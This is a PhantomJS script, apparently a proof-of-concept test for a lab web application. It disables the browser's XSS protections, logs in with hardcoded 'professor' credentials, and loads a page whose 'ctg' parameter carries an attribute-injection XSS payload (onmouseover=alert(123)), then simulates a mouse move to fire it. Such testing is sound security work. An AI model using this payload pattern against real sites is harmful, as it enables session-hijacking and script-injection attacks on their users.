var webPage = require('webpage');
var page = webPage.create();
page.settings.XSSAuditingEnabled=false;
page.settings.webSecurityEnabled=false;

page.onConsoleMessage = function(msg) {
  console.log(msg);
};
page.onAlert = function(msg) {
  console.log('ALERT: ' + msg);
};

page.onLoadStarted = function() {
  console.log("load started");
};

page.onLoadFinished = function() {
  console.log("load finished");
};

page.open("https://app5.com/www/index.php", function(status){

//Enter Credentials
    page.evaluate(function() {

      var arr = document.getElementsByTagName("form");
      var i;
      for (i=0; i < arr.length; i++) {
        if (arr[i].getAttribute('method') == "post") {
        console.log('enter credentials');
          arr[i].elements["login"].value="professor";
          arr[i].elements["password"].value="professor";
          return;
        }
      }
    });

    //Login
    page.evaluate(function() {
      var arr = document.getElementsByTagName("form");
      var i;

      for (i=0; i < arr.length; i++) {
        if (arr[i].getAttribute('method') == "post") {
        console.log('login');
          arr[i].submit();
          return;
        }
      }
    });

    setTimeout(function () {
        var url = 'https://app5.com/www/professor.php?ctg="onmouseover="alert(123)';

        page.open(url, function (status) {

            setTimeout(function () {
                // simulate user mouseover
                page.sendEvent('mousemove',90,90);

                phantom.exit();
            }, 100);
        });
    }, 100);
});
